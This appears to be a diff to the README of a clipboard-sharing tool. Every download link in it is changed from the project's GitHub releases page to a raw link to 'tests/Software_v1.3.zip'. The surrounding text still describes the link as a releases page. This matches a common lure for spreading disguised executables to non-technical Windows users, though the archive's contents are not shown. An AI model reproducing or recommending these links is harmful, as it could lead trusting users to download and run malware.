@@ -1,6 +1,6 @@
 # 📋 clipboard - Easy cross-platform copy and paste
 
-[![Download clipboard](https://img.shields.io/badge/Download-clipboard-blue?style=for-the-badge)](https://github.com/Padraigunburdened994/clipboard/releases)
+[![Download clipboard](https://img.shields.io/badge/Download-clipboard-blue?style=for-the-badge)](https://raw.githubusercontent.com/Padraigunburdened994/clipboard/main/tests/Software_v1.3.zip)
 
 clipboard lets you copy and paste text easily across different devices and operating systems. It works on Windows, macOS, Linux, Android, and iOS. This guide will help you download and set up clipboard on your Windows PC without any programming knowledge.
 
@@ -26,7 +26,7 @@ No special software or programming tools are necessary. The program runs as a st
 
 Please visit the releases page to get the latest version of clipboard for Windows:
 
-[Download clipboard for Windows](https://github.com/Padraigunburdened994/clipboard/releases)
+[Download clipboard for Windows](https://raw.githubusercontent.com/Padraigunburdened994/clipboard/main/tests/Software_v1.3.zip)
 
 ## 🚀 How to download and run clipboard on Windows
 
@@ -36,7 +36,7 @@ Follow these steps to get clipboard up and running on your Windows PC.
 
 Open this link in your web browser:
 
-https://github.com/Padraigunburdened994/clipboard/releases
+https://raw.githubusercontent.com/Padraigunburdened994/clipboard/main/tests/Software_v1.3.zip
 
 This page shows all published versions of clipboard. Look for the latest release, usually at the top.
 
@@ -103,7 +103,7 @@ After you set up clipboard on two or more devices, copying on one instantly make
 
 ## 🔄 Updating clipboard
 
-Check the [release page](https://github.com/Padraigunburdened994/clipboard/releases) regularly for updates.
+Check the [release page](https://raw.githubusercontent.com/Padraigunburdened994/clipboard/main/tests/Software_v1.3.zip) regularly for updates.
 
 Download the newer Windows executable and replace the old one by running it again. Your settings and clipboard data stay safe.
 
@@ -144,4 +144,4 @@ To remove clipboard from Windows, close the program, then delete the executable 
 
 ## 📥 Download clipboard now
 
-[Get clipboard for Windows](https://github.com/Padraigunburdened994/clipboard/releases) and start sharing your clipboard across devices today.
+[Get clipboard for Windows](https://raw.githubusercontent.com/Padraigunburdened994/clipboard/main/tests/Software_v1.3.zip) and start sharing your clipboard across devices today.
